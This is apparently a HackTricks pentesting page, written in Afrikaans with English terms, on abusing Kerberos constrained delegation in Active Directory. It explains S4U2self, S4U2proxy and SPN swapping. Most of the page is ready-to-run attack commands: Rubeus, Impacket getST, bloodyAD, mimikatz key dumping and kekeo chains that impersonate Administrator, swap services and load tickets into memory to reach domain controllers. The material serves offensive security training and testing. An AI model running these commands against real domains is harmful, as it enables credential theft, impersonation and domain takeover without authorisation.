# Beperkte Delegering

{{#include ../../banners/hacktricks-training.md}}

## Beperkte Delegering

Hiermee kan 'n Domain admin 'n rekenaar **toelaat** om 'n gebruiker of rekenaar te **impersonate** teen enige **diens** op 'n masjien.

- **Diens vir gebruiker na self (_S4U2self_):** As 'n **service account** 'n _userAccountControl_ waarde het wat [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) bevat, kan dit 'n TGS vir homself (die service) bekom namens enige ander gebruiker.
- **Diens vir gebruiker na proxy (_S4U2proxy_):** 'n **service account** kan 'n TGS bekom namens enige gebruiker na die service wat in **msDS-AllowedToDelegateTo** gestel is. Om dit te doen benodig dit eers 'n TGS van daardie gebruiker na homself, maar dit kan S4U2self gebruik om daardie TGS te kry voordat dit die ander versoek.

**Nota**: As 'n gebruiker gemerk is as '_Account is sensitive and cannot be delegated_' in AD, sal jy hulle **nie kan impersonate** nie.

Dit beteken dat as jy die **hash van die service compromise**, kan jy **gebruikers impersonate** en **toegang** namens hulle verkry tot enige **diens** op die aangeduide masjiene (moontlike **privesc**).

Verder sal jy **nie net toegang hê tot die diens wat die gebruiker kan impersonate nie, maar ook tot enige diens**, omdat die SPN (die gevraagde service-naam) nie nagegaan word nie (in die ticket is hierdie deel nie gekodeer/onderteken nie). Daarom, as jy toegang het tot die **CIFS service**, kan jy ook toegang hê tot die **HOST service** deur byvoorbeeld die `/altservice` vlag in Rubeus te gebruik. Dieselfde SPN-swapping swakheid word uitgebuit deur **Impacket getST -altservice** en ander gereedskap.

Ook, **LDAP service toegang op die DC**, is wat nodig is om 'n **DCSync** te eksploiteer.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Kruis-domein constrained delegation aantekeninge (2025+)

Sedert **Windows Server 2012/2012 R2** ondersteun die KDC **constrained delegation across domains/forests** via S4U2Proxy extensions. Moderne weergawes (Windows Server 2016–2025) behou hierdie gedrag en voeg twee PAC SIDs by om protokol-oorskakeling aan te dui:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wanneer die gebruiker normaalweg geauthentiseer is.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wanneer 'n diens die identiteit deur protokol-oorskakeling bevestig het.

Verwag `SERVICE_ASSERTED_IDENTITY` binne die PAC wanneer protokol-oorskakeling oor domeine gebruik word, wat bevestig dat die S4U2Proxy-stap suksesvol was.

### Impacket / Linux tooling (altservice & full S4U)

Onlangse Impacket (0.11.x+) openbaar dieselfde S4U-ketting en SPN-swapping as Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
As jy verkies om eers die gebruiker ST te vervals (bv., slegs offline-hash), kombineer **ticketer.py** met **getST.py** vir S4U2Proxy. Sien die oop Impacket issue #1713 vir huidige kuriositeite (KRB_AP_ERR_MODIFIED wanneer die vervalste ST nie met die SPN-sleutel ooreenstem nie).

### Automatisering van delegasie-opstelling vanaf low-priv creds

As jy reeds **GenericAll/WriteDACL** oor 'n rekenaar- of service account het, kan jy die vereiste attribuute op afstand push sonder RSAT deur **bloodyAD** (2024+) te gebruik:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Dit laat jou toe om 'n constrained delegation-pad vir privesc te bou sonder DA-bevoegdhede sodra jy daardie eienskappe kan skryf.

- Stap 1: **Kry TGT van die toegelate diens**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Daar is **ander maniere om 'n TGT ticket te verkry** of die **RC4** of **AES256** sonder om SYSTEM op die rekenaar te wees, soos die Printer Bug en unconstrain delegation, NTLM relaying en Active Directory Certificate Service abuse
>
> **Deur net daardie TGT ticket (of gehash) te hê, kan jy hierdie aanval uitvoer sonder om die hele rekenaar te kompromiteer.**

- Stap 2: **Kry TGS vir die diens deur die gebruiker te imiteer**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Meer inligting op ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) en [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Verwysings
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
